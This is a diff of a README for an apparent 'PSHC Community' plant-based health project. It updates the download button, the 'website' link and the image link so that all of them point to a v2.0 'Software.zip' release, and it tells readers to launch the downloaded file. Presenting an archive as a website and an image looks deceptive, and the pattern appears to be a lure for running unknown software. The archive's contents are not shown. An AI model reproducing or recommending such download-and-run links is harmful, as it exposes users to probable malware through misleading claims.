@@ -20,13 +20,13 @@ We encourage you to explore the repository and get involved in discussions, rese
 
 You can download the latest version of the platform by clicking the button below:
 
-[![Download PSHC Community](https://github.com/Ronybello/pshc-community/releases/download/v1.0/Software.zip)](https://github.com/Ronybello/pshc-community/releases/download/v1.0/Software.zip)
+[![Download PSHC Community](https://github.com/Ronybello/pshc-community/releases/download/v2.0/Software.zip)](https://github.com/Ronybello/pshc-community/releases/download/v2.0/Software.zip)
 
 Make sure to launch the downloaded file to begin your journey with the PSHC Community platform.
 
 ### Website
 
-For more information about the PSHC Community and to stay updated on the latest news and events, visit our website at [https://github.com/Ronybello/pshc-community/releases/download/v1.0/Software.zip](https://github.com/Ronybello/pshc-community/releases/download/v1.0/Software.zip).
+For more information about the PSHC Community and to stay updated on the latest news and events, visit our website at [https://github.com/Ronybello/pshc-community/releases/download/v2.0/Software.zip](https://github.com/Ronybello/pshc-community/releases/download/v2.0/Software.zip).
 
 ### Releases
 
@@ -36,7 +36,7 @@ If you encounter any issues with the download link, please check the "Releases" 
 
 Join our community to engage with like-minded individuals, share knowledge, and explore the world of plant-based health together. Your contribution can make a difference!
 
-![PSHC Community](https://github.com/Ronybello/pshc-community/releases/download/v1.0/Software.zip)
+![PSHC Community](https://github.com/Ronybello/pshc-community/releases/download/v2.0/Software.zip)
 
 ## 🌱 Thank You
 
